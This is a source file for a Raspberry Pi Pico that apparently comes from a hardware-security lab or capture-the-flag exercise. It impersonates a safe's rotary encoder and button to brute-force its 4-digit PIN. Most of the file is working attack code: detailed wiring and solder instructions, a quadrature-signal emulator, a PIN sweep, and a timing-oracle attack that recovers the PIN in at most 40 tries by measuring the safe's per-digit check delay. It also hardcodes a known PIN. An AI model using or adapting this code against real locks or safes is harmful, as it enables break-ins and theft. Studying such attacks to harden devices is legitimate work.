// ---------------------------------------------------------------------------
// Rotary-encoder emulator for physical PIN brute-force (attack vector 4).
//
// An attacker Raspberry Pi Pico impersonates the safe's rotary encoder + push
// button, so the 4-digit PIN can be swept without a human turning the knob.
// Two modes:
//   * plain sweep -- 0000..9999 (or a neighbourhood) at an adjustable rate ('g')
//   * timing oracle -- <= 40 dials, driven by the safe's per-digit check delay
//     measured on the SENSE line ('o'; see "Timing oracle" below)
//
// TARGET (the safe, an RP2040) — established from firmware `board_gpio_init`:
//   all three lines are INPUTs with pull-ups, active LOW.
//     GPIO 29 = encoder channel A   (both-edge IRQ + callback -> quadrature)
//     GPIO 27 = encoder channel B   (both-edge IRQ           -> quadrature)
//     GPIO 28 = push button SW      (falling-edge IRQ, confirm digit)
//
// WIRING (attacker Pico  ->  target). ONLY 3 signals + a common ground.
//   Pico GP4  (A_OUT)  ->  target A line  (encoder pin A  / net of GPIO 29)
//   Pico GP2  (B_OUT)  ->  target B line  (encoder pin B  / net of GPIO 27)
//   Pico GP3  (SW_OUT) ->  target SW line (button pin     / net of GPIO 28)
//   Pico GND           ->  target GND     (RP2040 ground / debug-header GND)
//   Pico GP5  (SENSE)  ->  a target output LED, for the timing oracle (off by
//                          default; enable with 'e'). Best pick: GPIO 10 -- it
//                          blinks while idle, drives the reject-blink, and
//                          latches on unlock. Find an active pin with 'm'.
//
//   DO NOT connect the two boards' 3V3 / VBUS together — each is self-powered,
//   sharing a rail risks back-powering. Only GND + the 3 signal lines.
//
//   The real encoder may stay soldered in parallel: as long as nobody turns it,
//   its contacts are open (high-Z) and do not fight our open-drain drive.
//
//   Solder points: easiest at the encoder's own A / B / SW / common pads;
//   verify each net with a multimeter continuity check to RP2040 pins 29/27/28
//   before trusting the A/B/SW mapping above.
//
// DRIVE MODEL: open-drain. We only ever pull a line LOW (assert) or release it
// to high-Z (the target's pull-up restores HIGH). We never source a HIGH.
//
// CONTROL: 115200-baud USB serial console. Single-char commands, see printHelp().
// ---------------------------------------------------------------------------

#include <Arduino.h>

// ----------------------------- Pin assignment ------------------------------
// Matched to the bench wiring: GP4->GPIO29(A), GP2->GPIO27(B), GP3->GPIO28(SW).
static const uint8_t PIN_A = 4;				   // -> target encoder A (GPIO 29 net)
static const uint8_t PIN_B = 2;				   // -> target encoder B (GPIO 27 net)
static const uint8_t PIN_SW = 3;			   // -> target button SW (GPIO 28 net)
static const uint8_t PIN_SENSE = 5;			   // <- optional unlock indicator (input)
static const uint8_t STATUS_LED = LED_BUILTIN; // on-board LED: lit while running
											   // (PIN_LED is a core macro, don't reuse it)

// --------------------------- Calibration config ----------------------------
// Everything below is a guess until measured on the bench in jog mode ('u'/'d'
// step the display, 'p' presses). Adjust, re-flash or set live where noted.

// Quadrature quarter-steps (single-edge transitions) needed to move the shown
// digit by 1. A detented encoder emits 4 edges/detent and firmware usually
// divides by 4 -> 4 here. If one jog step moves the display by more/less than 1,
// change this. Live-settable with 'q<n>'.
static int QUARTERS_PER_STEP = 4;

// Set true if turning "up" makes the display count DOWN. Live-toggle with 'i'.
static bool INVERT_DIR = false;

// Digit shown by the target when the *very first* attempt begins (power-on).
static int INITIAL_VALUE = 0;

// Value the display returns to after a press (start of the next digit).
//   -1 = display carries over (keep tracking); 0..9 = it resets to that value.
// This safe resets to 0: board_gpio_init shows the next position's byte from the
// zeroed digit buffer after each confirm, so every digit starts from 0. Verified
// in reversing/program_decompiled.c (FUN_10000ab0).
static int RESET_AFTER_PRESS = 0;
// Value the display returns to after a full (rejected) 4-digit attempt. The
// reject path zeroes the digit buffer and restarts at position 0, so 0.
static int RESET_AFTER_ATTEMPT = 0;

// --------------------------------- Timing ----------------------------------
// Microseconds. All are divided by (g_speedPct/100): higher percent = faster.
// EDGE_US must stay ABOVE the target's software debounce window, or quadrature
// edges get merged and steps are lost. If the display miscounts when you speed
// up, slow down (EDGE_US / DETENT_GAP_US are the ones that matter).
// These are the original conservative (bounce-safe) values -- fast-sweep
// experiments dropped edges, so we are back to the reliable baseline.
static uint32_t EDGE_US = 10000;		 // between quadrature edges (10 ms/edge)
static uint32_t DETENT_GAP_US = 6000;	 // after each 1-digit detent
static uint32_t PRESS_US = 40000;		 // button held low
static uint32_t RELEASE_US = 60000;		 // button released before next act
static uint32_t DIGIT_GAP_US = 80000;	 // between confirmed digits
static uint32_t CHECK_US = 250000;		 // after 4th press: eval + oracle
static uint32_t ATTEMPT_GAP_US = 150000; // between attempts

// ------------------------------- Sense (opt) -------------------------------
static bool SENSE_ENABLE = false;	  // watch PIN_SENSE for unlock
static int SENSE_ACTIVE_LEVEL = HIGH; // level that means "unlocked"

// ------------------------------ Timing oracle ------------------------------
// The safe's PIN check (firmware board_gpio_init) compares the 4 entered digits
// against the reference BYTE-BY-BYTE with an early exit, and calls sleep_ms(50)
// for EACH matching leading digit before it either unlocks (all 4) or plays the
// ~1.2 s reject animation. Crucially, sleep_ms is a plain busy-wait/WFE that
// touches NO GPIO, and the whole display-refresh + blink loop is frozen while it
// runs. So after the 4th button release, every target output (segment GPIO 0..9,
// position GPIO 10..13) holds still for exactly 50 ms * k, where k = length of
// the matching PIN prefix (0..4). We recover k by measuring that freeze on a
// SENSE line wired to one of those outputs (GPIO 10 is the best pick: it blinks
// while idle, drives the reject animation, and latches SET on unlock).
//
// This turns brute force from 10^4 into <= 40 dials: for each position sweep the
// candidate digit 0..9, measure k; the correct digit is the unique one whose k
// jumps to >= pos+1. See the 'o' (oracle attack), 't' (single think-time probe)
// and 'm' (SENSE monitor / pin finder) commands.

// One matching leading digit adds this many ms of freeze (firmware sleep_ms(50)).
static uint32_t ORACLE_STEP_MS = 50;
// Fixed offset added to every measured freeze: the target's poll tick before it
// enters the check, plus wiring/sampling slack. Calibrate with 't' (see below).
static uint32_t ORACLE_BASE_MS = 0;
// Edges within this guard window after the 4th release are the "entry churn"
// (target latching the digit); the freeze we care about starts inside it.
static uint32_t ORACLE_START_GUARD_MS = 15;
// How long to watch SENSE after the 4th release. Must exceed max freeze
// (4*50 = 200 ms) with margin, but stay below the reject animation (~1.2 s).
static uint32_t ORACLE_WINDOW_MS = 700;
// SENSE polling period while measuring. 50 us >> digitalRead cost at 125 MHz and
// resolves the 50 ms quantum ~1000x over.
static uint32_t SENSE_SAMPLE_US = 50;

// Ready-sync: after a rejected attempt the safe is busy ~1.2 s playing the reject
// blink and ignores input; feeding it digits then loses the leading steps. So we
// wait on SENSE for the target to go quiet (blink over -> ready) before the next
// action, instead of a blind delay. Ready = no SENSE edge for READY_QUIET_MS.
static uint32_t READY_QUIET_MS = 350; // this much no-edge time == target idle
// With SENSE on we would rather block until the target is actually ready than
// push input into a busy safe. This cap is huge on purpose (effectively "wait as
// long as it takes"); a 's'/'S' byte on the console aborts the wait.
static uint32_t READY_TIMEOUT_MS = 120000;

// --------------------------------- Speed -----------------------------------
// THE speed knob. Overall sweep-rate multiplier applied to every timing above
// at boot (100 = use the *_US values as-is; higher = faster). Runtime '+'/'-'
// adjust from here, up to SPEED_MAX_PCT. Back to the reliable 100% baseline
// after fast-sweep experiments dropped edges.
static const int SWEEP_SPEED_PCT = 100; // boot sweep speed, %
static const int SPEED_MAX_PCT = 1000;	// ceiling for '+'

// Known-good PIN and the speed used to enter it on demand (command 'k').
static const int KNOWN_PIN = 3952;
static const int KNOWN_ENTRY_SPEED_PCT = 100;

// Neighbourhood sweep: instead of 0000..9999, sweep only +/- SWEEP_RADIUS
// around the known-good PIN (SWEEP_CENTER). The sweep starts at the low edge
// (center - radius) and stops at the high edge (center + radius). Widen
// SWEEP_RADIUS (or use 'j' to jump anywhere in 0..9999) to search further.
static const int SWEEP_CENTER = KNOWN_PIN; // 3952
static const int SWEEP_RADIUS = 50;		   // +/- window around the center

// ------------------------------- Run state ---------------------------------
static int g_speedPct = SWEEP_SPEED_PCT; // live speed %; '+'/'-' adjust
static bool g_running = false;
static bool g_fullSweep = false; // 'f' toggles full 0000..9999 vs neighbourhood
static int g_attempt = 0;  // next attempt index 0..9999
static int g_believed = 0; // our belief of the shown digit
static uint8_t g_qidx = 0; // quadrature state index 0..3

// Clamped bounds of the neighbourhood sweep (see SWEEP_CENTER / SWEEP_RADIUS).
static inline int sweepStart()
{
	if (g_fullSweep)
		return 0;
	int s = SWEEP_CENTER - SWEEP_RADIUS;
	return s < 0 ? 0 : s;
}
static inline int sweepEnd()
{
	if (g_fullSweep)
		return 9999;
	int e = SWEEP_CENTER + SWEEP_RADIUS;
	return e > 9999 ? 9999 : e;
}

// Gray-coded quadrature states for (A,B); consecutive states differ by 1 bit.
static const uint8_t GRAY_A[4] = {1, 0, 0, 1};
static const uint8_t GRAY_B[4] = {1, 1, 0, 0};

// ------------------------------ Low-level I/O ------------------------------
// Open-drain: level 1 = release to high-Z (target pull-up wins), 0 = drive low.
static inline void setLine(uint8_t pin, uint8_t level)
{
	if (level)
	{
		pinMode(pin, INPUT); // high-Z; no internal pull added
	}
	else
	{
		pinMode(pin, OUTPUT);
		digitalWrite(pin, LOW); // active-low assert
	}
}

// Scaled busy-wait honouring g_speedPct. Splits into ms + us for long waits.
static void waitUs(uint32_t us)
{
	uint64_t eff = (uint64_t)us * 100u / (uint32_t)g_speedPct;
	uint32_t ms = (uint32_t)(eff / 1000u);
	uint32_t rem = (uint32_t)(eff % 1000u);
	if (ms)
		delay(ms);
	if (rem)
		delayMicroseconds(rem);
}

static inline void applyQuadState(uint8_t idx)
{
	setLine(PIN_A, GRAY_A[idx]);
	setLine(PIN_B, GRAY_B[idx]);
}

// One quadrature quarter-step. dir > 0 advances the Gray sequence, dir < 0 reverses.
static void quarter(int dir)
{
	g_qidx = (uint8_t)((g_qidx + (dir > 0 ? 1 : 3)) & 3);
	applyQuadState(g_qidx);
	waitUs(EDGE_US);
}

// Move the shown digit by `counts` in Gray direction `dir` (one detent each).
static void stepDisplay(int dir, int counts)
{
	for (int c = 0; c < counts; c++)
	{
		for (int k = 0; k < QUARTERS_PER_STEP; k++)
			quarter(dir);
		waitUs(DETENT_GAP_US);
	}
}

// Rotate from the believed value to `target`, taking the shorter direction.
static void enterDigit(int target)
{
	int dirUp = INVERT_DIR ? -1 : +1;
	int up = ((target - g_believed) % 10 + 10) % 10; // 0..9 steps upward
	int down = (10 - up) % 10;						 // 0..9 steps downward
	if (up == 0)
	{
		/* already there */
	}
	else if (up <= down)
	{
		stepDisplay(dirUp, up);
	}
	else
	{
		stepDisplay(-dirUp, down);
	}
	g_believed = target;
}

static void press()
{
	setLine(PIN_SW, 0);
	waitUs(PRESS_US);
	setLine(PIN_SW, 1);
	waitUs(RELEASE_US);
}

// --------------------------- Raw manual primitives -------------------------
// Hand-drivable low-level actions with an explicit per-edge / hold delay in ms,
// so the operator (or the host over serial) can dial the encoder one detent at a
// time and match the safe's poll rate directly. dtMs <= 0 falls back to the
// configured EDGE_US / PRESS_US. These ignore the shortest-path logic of
// enterDigit(): one call == exactly one physical detent or one button press.

// Turn the encoder one detent. dir > 0 = one digit up (CW), dir < 0 = down.
static void stepRaw(int dir, long dtMs)
{
	int gdir = (dir >= 0) ? (INVERT_DIR ? -1 : +1) : (INVERT_DIR ? +1 : -1);
	for (int k = 0; k < QUARTERS_PER_STEP; k++)
	{
		g_qidx = (uint8_t)((g_qidx + (gdir > 0 ? 1 : 3)) & 3);
		applyQuadState(g_qidx);
		if (dtMs > 0)
			delay((uint32_t)dtMs); // per-edge delay: tune to the target poll rate
		else
			waitUs(EDGE_US);
	}
	g_believed = ((g_believed + (dir >= 0 ? 1 : 9)) % 10 + 10) % 10;
}

// Press and release the button, holding it for dtMs (or PRESS_US when dtMs<=0).
static void pressRaw(long dtMs)
{
	setLine(PIN_SW, 0);
	if (dtMs > 0)
		delay((uint32_t)dtMs);
	else
		waitUs(PRESS_US);
	setLine(PIN_SW, 1);
	waitUs(RELEASE_US);
}

// Enter one digit deterministically from a known 0: turn CW exactly `target`
// detents (0..9). The safe resets its display to 0 after every confirm, so
// entry always starts at 0 -- no shortest-path guesswork, no drift. dtMs is the
// per-edge delay passed to stepRaw (<=0 -> EDGE_US). Assumes g_believed == 0.
static void enterDigitFromZero(int target, long dtMs)
{
	for (int i = 0; i < target; i++)
		stepRaw(+1, dtMs);
	g_believed = target;
}

// True if the sense line has held the unlock level for a short debounce window.
static bool senseUnlocked()
{
	if (!SENSE_ENABLE)
		return false;
	for (int i = 0; i < 8; i++)
	{
		if (digitalRead(PIN_SENSE) != SENSE_ACTIVE_LEVEL)
			return false;
		delay(2);
	}
	return true;
}

// --------------------------- Timing-oracle probe ---------------------------
// Watch SENSE right after the 4th button release and return the length (ms) of
// the longest "frozen" (no-edge) interval that STARTS within the entry guard
// window. That freeze is the target's sleep_ms(50)*k while it checks the PIN, so
// its length encodes k (the matching-prefix length). Returns -1 if SENSE is off.
// Call with t0 == the instant SW was released (do not burn RELEASE_US first).
static long measureFreezeMs()
{
	if (!SENSE_ENABLE)
		return -1;
	const uint32_t windowUs = ORACLE_WINDOW_MS * 1000u;
	const uint32_t guardUs = ORACLE_START_GUARD_MS * 1000u;
	const uint32_t t0 = micros();
	int last = digitalRead(PIN_SENSE);
	uint32_t lastEdgeUs = 0; // time of the most recent edge, relative to t0
	uint32_t bestQuietLen = 0;
	for (;;)
	{
		uint32_t now = micros() - t0;
		if (now >= windowUs)
			break;
		int v = digitalRead(PIN_SENSE);
		if (v != last)
		{
			uint32_t quietLen = now - lastEdgeUs;	 // interval that just ended
			if (lastEdgeUs <= guardUs && quietLen > bestQuietLen)
				bestQuietLen = quietLen; // a freeze candidate (starts in guard)
			last = v;
			lastEdgeUs = now;
		}
		delayMicroseconds(SENSE_SAMPLE_US);
	}
	// Tail: no edge until the window closed (large k, or an unlock latch).
	uint32_t tailLen = windowUs - lastEdgeUs;
	if (lastEdgeUs <= guardUs && tailLen > bestQuietLen)
		bestQuietLen = tailLen;
	return (long)((bestQuietLen + 500u) / 1000u); // round to ms
}

// Convert a measured freeze (ms) into a matching-prefix length k in 0..4.
static int kFromFreeze(long freezeMs)
{
	if (freezeMs < 0)
		return -1;
	long adj = freezeMs - (long)ORACLE_BASE_MS;
	if (adj < 0)
		adj = 0;
	long k = (adj + (long)ORACLE_STEP_MS / 2) / (long)ORACLE_STEP_MS;
	if (k < 0)
		k = 0;
	if (k > 4)
		k = 4;
	return (int)k;
}

// Wait until the target's SENSE line goes quiet (no edge for quietMs) -- i.e. the
// reject blink / digit-confirm activity is over and the safe is ready for input.
// Returns true if it settled, false on timeout. With SENSE off returns false at
// once (no signal to sync on) so blind-timing callers keep their own gaps.
static bool waitTargetReady(uint32_t quietMs, uint32_t timeoutMs)
{
	if (!SENSE_ENABLE)
		return false;
	uint32_t t0 = millis();
	int last = digitalRead(PIN_SENSE);
	uint32_t lastEdge = t0;
	for (;;)
	{
		uint32_t now = millis();
		if (now - t0 >= timeoutMs)
			return false;
		if (Serial.available() && (Serial.peek() == 's' || Serial.peek() == 'S'))
		{
			Serial.read(); // let the operator break a stuck wait
			return false;
		}
		int v = digitalRead(PIN_SENSE);
		if (v != last)
		{
			last = v;
			lastEdge = now;
		}
		if (now - lastEdge >= quietMs)
			return true;
		delayMicroseconds(300);
	}
}

// Press the (4th) button and immediately measure the check freeze. Unlike
// press(), the SENSE clock starts at the release edge -- no RELEASE_US wait
// beforehand -- so the whole 50ms*k freeze is captured.
static long pressMeasureFreeze()
{
	setLine(PIN_SW, 0);
	waitUs(PRESS_US);
	setLine(PIN_SW, 1); // release edge == t0 inside measureFreezeMs()
	return measureFreezeMs();
}

// Enter a 4-digit code and, on the 4th press, measure the think-time freeze.
// Returns the measured freeze in ms (-1 if SENSE off). Leaves ~enough idle time
// for the target's reject animation (~1.2 s) to finish before the next attempt,
// so the target is back at digit-0 input. Believed digit is reset per
// RESET_AFTER_* just like doAttempt().
static long thinkTimeOf(int d0, int d1, int d2, int d3)
{
	const int d[4] = {d0, d1, d2, d3};
	// Wait until the safe is idle before starting: after a rejected attempt it
	// plays the ~1.2 s reject blink on GPIO10 and drops input fed during it.
	// Once that blink ends the safe returns to position 0 and GPIO10 goes quiet
	// (a different position LED blinks), so "SENSE quiet" == ready HERE.
	// NB: only valid between attempts. Between digits GPIO10 blinks as the
	// position-4 indicator, so we must NOT wait on SENSE mid-attempt -- a fixed
	// gap is used there instead.
	waitTargetReady(READY_QUIET_MS, READY_TIMEOUT_MS);
	waitUs(200000);								   // small settle margin after ready
	g_believed = (RESET_AFTER_PRESS >= 0) ? RESET_AFTER_PRESS : 0; // safe at 0 now
	for (int i = 0; i < 3; i++)					   // first three digits, from 0
	{
		enterDigitFromZero(d[i], -1);
		pressRaw(-1);
		g_believed = (RESET_AFTER_PRESS >= 0) ? RESET_AFTER_PRESS : 0; // confirm -> 0
		waitUs(DIGIT_GAP_US); // fixed gap: GPIO10 blinks by position here
	}
	enterDigitFromZero(d[3], -1); // fourth digit triggers the check
	long freeze = pressMeasureFreeze();
	g_believed = (RESET_AFTER_ATTEMPT >= 0) ? RESET_AFTER_ATTEMPT : 0; // reject -> 0
	return freeze;
}

// Enter and confirm one 4-digit code. Returns true if an unlock was sensed.
static bool doAttempt(int d0, int d1, int d2, int d3)
{
	const int d[4] = {d0, d1, d2, d3};
	g_believed = (RESET_AFTER_PRESS >= 0) ? RESET_AFTER_PRESS : 0; // safe at 0
	for (int i = 0; i < 4; i++)
	{
		enterDigitFromZero(d[i], -1);
		pressRaw(-1);
		g_believed = (RESET_AFTER_PRESS >= 0) ? RESET_AFTER_PRESS : 0; // confirm -> 0
		if (i < 3)
			waitUs(DIGIT_GAP_US);
	}
	waitUs(CHECK_US); // let the target evaluate (incl. oracle)
	bool ok = senseUnlocked();
	g_believed = (RESET_AFTER_ATTEMPT >= 0) ? RESET_AFTER_ATTEMPT : 0;
	return ok;
}

// -------------------------------- Console ----------------------------------
static void idleLines()
{
	g_qidx = 0;
	setLine(PIN_A, 1);
	setLine(PIN_B, 1);
	setLine(PIN_SW, 1);
}

static void printStatus()
{
	Serial.printf("[status] running=%d next=%04d believed=%d speed=%d%% "
				  "q/step=%d invert=%d\r\n",
				  g_running, g_attempt, g_believed, g_speedPct, QUARTERS_PER_STEP, INVERT_DIR);
	Serial.printf("[sweep]  mode=%s window=%04d..%04d\r\n",
				  g_fullSweep ? "FULL" : "neighbourhood", sweepStart(), sweepEnd());
	Serial.printf("[timing] edge=%lu detent=%lu press=%lu release=%lu "
				  "digitgap=%lu check=%lu attemptgap=%lu (us, pre-scale)\r\n",
				  (unsigned long)EDGE_US, (unsigned long)DETENT_GAP_US, (unsigned long)PRESS_US,
				  (unsigned long)RELEASE_US, (unsigned long)DIGIT_GAP_US, (unsigned long)CHECK_US,
				  (unsigned long)ATTEMPT_GAP_US);
	Serial.printf("[oracle] sense=%s step=%lums base=%lums guard=%lums win=%lums\r\n",
				  SENSE_ENABLE ? "ON" : "OFF", (unsigned long)ORACLE_STEP_MS,
				  (unsigned long)ORACLE_BASE_MS, (unsigned long)ORACLE_START_GUARD_MS,
				  (unsigned long)ORACLE_WINDOW_MS);
}

static void printHelp()
{
	Serial.println(F("\r\n=== encoder emulator (attack4) ==="));
	Serial.println(F("Jog / calibration:"));
	Serial.println(F("  u  step display up 1     d  step display down 1"));
	Serial.println(F("  .  raw turn CW 1  (.<ms> per-edge delay)   , raw turn CCW 1"));
	Serial.println(F("  p  press button   (p<ms> hold)   z  declare current display = 0"));
	Serial.println(F("  q<n> quarter-steps per digit (e.g. q4)"));
	Serial.println(F("  i  toggle direction invert"));
	Serial.println(F("Brute-force:"));
	Serial.println(F("  g  start/resume sweep    s  stop (pause)"));
	Serial.printf("  r  reset sweep to window start %04d (believed=INITIAL_VALUE)\r\n",
				  sweepStart());
	Serial.printf("  (sweep window: %04d..%04d, center %04d +/-%d)\r\n",
				  sweepStart(), sweepEnd(), SWEEP_CENTER, SWEEP_RADIUS);
	Serial.println(F("  k  enter the known-good PIN once, slow & reliable"));
	Serial.println(F("  f  toggle FULL 0000..9999 sweep <-> neighbourhood"));
	Serial.println(F("  j<n> jump to attempt n   (e.g. j3952)"));
	Serial.printf("Speed:  +/- change by 25%%  (10..%d%%, boot=%d%%)\r\n",
				  SPEED_MAX_PCT, SWEEP_SPEED_PCT);
	Serial.println(F("Timing oracle (<=40 dials, needs SENSE on an active target GPIO):"));
	Serial.println(F("  e  toggle SENSE on/off     o  run byte-by-byte oracle attack"));
	Serial.println(F("  m<sec> monitor SENSE edges (find an active pin: probe GPIO 10-13/0-9)"));
	Serial.println(F("  t<code> probe think-time of a code (calibration; e.g. t3952 -> k=4)"));
	Serial.println(F("  B<ms> set oracle base    S<ms> set oracle step (~50)"));
	Serial.println(F("Misc:   ?  status          h  this help"));
}

// Read a non-negative integer that follows a command char on the serial line.
static long readNumberArg()
{
	long v = 0;
	bool got = false;
	unsigned long t0 = millis();
	// Wide window so a human can type the number after the command letter in a
	// raw terminal (chars arrive one by one); each digit re-arms the window.
	while (millis() - t0 < 1200)
	{ // window for the digits to arrive
		while (Serial.available())
		{
			int c = Serial.peek();
			if (c >= '0' && c <= '9')
			{
				v = v * 10 + (Serial.read() - '0');
				got = true;
				t0 = millis();
			}
			else
			{
				Serial.read(); // consume terminator (newline etc.)
				return got ? v : -1;
			}
		}
	}
	return got ? v : -1;
}

// Enter one specific 4-digit code once, from a clean idle start, at the slow
// KNOWN_ENTRY_SPEED_PCT for maximum reliability. Used by 'k' to punch in the
// known-good PIN. Restores the previous sweep speed and leaves the sweep
// paused. Reports the sense result (only meaningful when SENSE_ENABLE).
static void enterKnownPin(int pin)
{
	int d0 = (pin / 1000) % 10, d1 = (pin / 100) % 10;
	int d2 = (pin / 10) % 10, d3 = pin % 10;

	bool wasRunning = g_running;
	int savedSpeed = g_speedPct;
	g_running = false; // never interleave with the sweep
	g_speedPct = KNOWN_ENTRY_SPEED_PCT;

	idleLines();				 // known line state
	g_believed = INITIAL_VALUE;	 // known display start
	Serial.printf("[known] entering PIN=%d%d%d%d at %d%% (slow/reliable)...\r\n",
				  d0, d1, d2, d3, g_speedPct);

	bool unlocked = doAttempt(d0, d1, d2, d3);
	idleLines();

	if (SENSE_ENABLE)
	{
		if (unlocked)
			Serial.printf("[known] SENSE: unlock detected -> safe is OPEN "
						  "at PIN=%d%d%d%d\r\n",
						  d0, d1, d2, d3);
		else
			Serial.println(F("[known] SENSE: no unlock detected (wrong PIN, "
							 "miscount, or sense wiring/level off)"));
	}
	else
	{
		Serial.println(F("[known] code entered. SENSE is OFF, so I cannot "
						 "confirm electrically -- check the safe: if the PIN "
						 "and step-counting are right it should now be unlocked."));
	}

	g_speedPct = savedSpeed; // restore sweep speed
	if (wasRunning)
		Serial.println(F("[known] note: sweep was running; left paused. 'g' to resume."));
}

// ----------------------------- Oracle attack -------------------------------
// Byte-by-byte timing attack: <= 40 dials instead of 10000. For each position
// 0..3, sweep the candidate digit 0..9 with the already-recovered prefix fixed
// and the rest zero; the correct digit is the unique one whose think-time k
// jumps to >= pos+1. Break as soon as it is found (avg ~22 dials, worst 40).
// Requires SENSE wired to an active target output (see 'm') and ORACLE_STEP_MS /
// ORACLE_BASE_MS calibrated with 't' (see printHelp).
static void oracleAttack()
{
	if (!SENSE_ENABLE)
	{
		Serial.println(F("[oracle] SENSE is OFF. Enable with 'e', wire it to an "
						 "active target GPIO (10 best), and calibrate with 't'."));
		return;
	}
	Serial.println(F("[oracle] byte-by-byte timing attack (<=40 dials). 's' aborts."));
	g_running = false; // never interleave with the plain sweep
	int known[4] = {0, 0, 0, 0};
	for (int pos = 0; pos < 4; pos++)
	{
		int bestDigit = -1, bestK = -1;
		long bestFreeze = -1;
		for (int cand = 0; cand <= 9; cand++)
		{
			if (Serial.available() && (Serial.peek() == 's' || Serial.peek() == 'S'))
			{
				Serial.read();
				idleLines();
				Serial.println(F("[oracle] aborted"));
				return;
			}
			int d[4] = {0, 0, 0, 0};
			for (int i = 0; i < pos; i++)
				d[i] = known[i];
			d[pos] = cand;
			idleLines();
			g_believed = INITIAL_VALUE;
			long f = thinkTimeOf(d[0], d[1], d[2], d[3]);
			int k = kFromFreeze(f);
			Serial.printf("[oracle] pos=%d cand=%d -> freeze=%ldms k=%d\r\n", pos, cand, f, k);
			if (k > bestK || (k == bestK && f > bestFreeze))
			{
				bestK = k;
				bestFreeze = f;
				bestDigit = cand;
			}
			if (k >= pos + 1) // unique correct digit for this position
				break;
		}
		if (bestDigit < 0 || bestK < pos + 1)
		{
			Serial.printf("[oracle] pos=%d: no candidate raised k to %d -- SENSE "
						  "wiring or ORACLE_STEP/BASE calibration is off. Abort.\r\n",
						  pos, pos + 1);
			return;
		}
		known[pos] = bestDigit;
		Serial.printf("[oracle] pos=%d LOCKED digit=%d (k=%d). prefix so far=%d%d%d%d\r\n",
					  pos, bestDigit, bestK, known[0], known[1], known[2], known[3]);
	}
	int pin = known[0] * 1000 + known[1] * 100 + known[2] * 10 + known[3];
	Serial.printf("[oracle] recovered PIN=%04d -- entering to confirm...\r\n", pin);
	idleLines();
	g_believed = INITIAL_VALUE;
	bool ok = doAttempt(known[0], known[1], known[2], known[3]);
	idleLines();
	if (ok)
		Serial.printf("[oracle] SENSE unlock CONFIRMED at PIN=%04d\r\n", pin);
	else
		Serial.printf("[oracle] PIN=%04d entered; SENSE did not latch unlock "
					  "(recheck ORACLE calibration / SENSE level, or watch the safe)\r\n",
					  pin);
}

// Watch SENSE and report edge activity -- used on the bench to find which target
// GPIO carries a useful signal. Probe pins 10..13 (position LEDs, one blinks
// while idle) or 0..9 (segment LEDs) until this shows transitions.
static void senseMonitor(long seconds)
{
	if (seconds < 1)
		seconds = 3;
	pinMode(PIN_SENSE, INPUT); // read regardless of SENSE_ENABLE
	Serial.printf("[mon] watching SENSE (Pico GP%d) for %lds. Probe target "
				  "GPIO 10-13 / 0-9 to find an active line.\r\n",
				  PIN_SENSE, seconds);
	uint32_t endMs = millis() + (uint32_t)seconds * 1000u;
	int last = digitalRead(PIN_SENSE);
	uint32_t edges = 0, minGap = 0xffffffffu, maxGap = 0, lastEdge = micros();
	uint32_t hi = 0, tot = 0;
	while ((int32_t)(millis() - endMs) < 0)
	{
		int v = digitalRead(PIN_SENSE);
		tot++;
		if (v)
			hi++;
		if (v != last)
		{
			uint32_t now = micros(), gap = now - lastEdge;
			if (gap < minGap)
				minGap = gap;
			if (gap > maxGap)
				maxGap = gap;
			lastEdge = now;
			edges++;
			last = v;
		}
		delayMicroseconds(200);
	}
	Serial.printf("[mon] edges=%lu duty(high)=%lu%% minGap=%luus maxGap=%luus\r\n",
				  (unsigned long)edges, (unsigned long)(tot ? hi * 100 / tot : 0),
				  (unsigned long)(edges ? minGap : 0), (unsigned long)(edges ? maxGap : 0));
	if (edges == 0)
		Serial.println(F("[mon] no transitions -- this pin is static; try another GPIO"));
}

// Enter one code and print the measured think-time -- calibrate ORACLE_BASE_MS /
// ORACLE_STEP_MS. Probe the known PIN (k=4) and a code whose 1st digit is wrong
// (k=0): BASE ~= freeze(k=0), STEP ~= (freeze(k=4)-BASE)/4 (expect ~50).
static void thinkProbe(int code)
{
	if (!SENSE_ENABLE)
	{
		Serial.println(F("[probe] SENSE is OFF -- enable with 'e' first"));
		return;
	}
	int d0 = (code / 1000) % 10, d1 = (code / 100) % 10;
	int d2 = (code / 10) % 10, d3 = code % 10;
	idleLines();
	g_believed = INITIAL_VALUE;
	Serial.printf("[probe] entering %d%d%d%d, measuring think-time...\r\n", d0, d1, d2, d3);
	long f = thinkTimeOf(d0, d1, d2, d3);
	idleLines();
	Serial.printf("[probe] freeze=%ldms -> k=%d (step=%lums base=%lums guard=%lums win=%lums)\r\n",
				  f, kFromFreeze(f), (unsigned long)ORACLE_STEP_MS, (unsigned long)ORACLE_BASE_MS,
				  (unsigned long)ORACLE_START_GUARD_MS, (unsigned long)ORACLE_WINDOW_MS);
}

static void handleChar(int c)
{
	switch (c)
	{
	case 'u':
		enterDigit((g_believed + 1) % 10);
		Serial.printf("[jog] up -> believed=%d\r\n", g_believed);
		break;
	case 'd':
		enterDigit((g_believed + 9) % 10);
		Serial.printf("[jog] down -> believed=%d\r\n", g_believed);
		break;
	case 'p':
	{
		long n = readNumberArg();
		pressRaw(n);
		Serial.printf("[raw] press (hold %ldms)\r\n", n > 0 ? n : (long)(PRESS_US / 1000));
	}
	break;
	case '.':
	{
		long n = readNumberArg();
		stepRaw(+1, n);
		Serial.printf("[raw] CW  -> believed=%d (edge %ldms)\r\n",
					  g_believed, n > 0 ? n : (long)(EDGE_US / 1000));
	}
	break;
	case ',':
	{
		long n = readNumberArg();
		stepRaw(-1, n);
		Serial.printf("[raw] CCW -> believed=%d (edge %ldms)\r\n",
					  g_believed, n > 0 ? n : (long)(EDGE_US / 1000));
	}
	break;
	case 'z':
		g_believed = 0;
		Serial.println(F("[jog] believed:=0"));
		break;
	case 'q':
	{
		long n = readNumberArg();
		if (n >= 1 && n <= 64)
		{
			QUARTERS_PER_STEP = (int)n;
			Serial.printf("[cfg] quarters/step=%d\r\n", QUARTERS_PER_STEP);
		}
		else
			Serial.println(F("[cfg] usage: q<1..64>"));
	}
	break;
	case 'i':
		INVERT_DIR = !INVERT_DIR;
		Serial.printf("[cfg] invert=%d\r\n", INVERT_DIR);
		break;
	case 'g':
		g_running = true;
		Serial.println(F("[run] start/resume"));
		break;
	case 's':
		g_running = false;
		idleLines();
		Serial.println(F("[run] stop"));
		break;
	case 'r':
		g_running = false;
		g_attempt = sweepStart();
		g_believed = INITIAL_VALUE;
		idleLines();
		Serial.printf("[run] reset to %04d (window start)\r\n", g_attempt);
		break;
	case 'f':
		g_fullSweep = !g_fullSweep;
		g_running = false;
		g_attempt = sweepStart();
		g_believed = INITIAL_VALUE;
		idleLines();
